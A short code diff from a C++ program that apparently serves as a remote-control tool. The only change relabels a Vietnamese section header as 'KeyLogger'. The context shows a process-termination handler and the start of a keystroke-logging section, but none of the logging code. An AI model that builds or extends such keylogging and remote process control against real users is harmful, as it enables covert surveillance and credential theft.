@@ -289,7 +289,7 @@ std::string stop_process_by_name(const std::string& name) {
     return html_page("<h1>Terminated " + std::to_string(count) + " processes named " + name + "</h1>");
 }
 
-// ====================== Bat phim Nhan ======================
+// ====================== KeyLogger ======================
 std::string KEY_LOG = "";
 
 std::string keylog_control() {
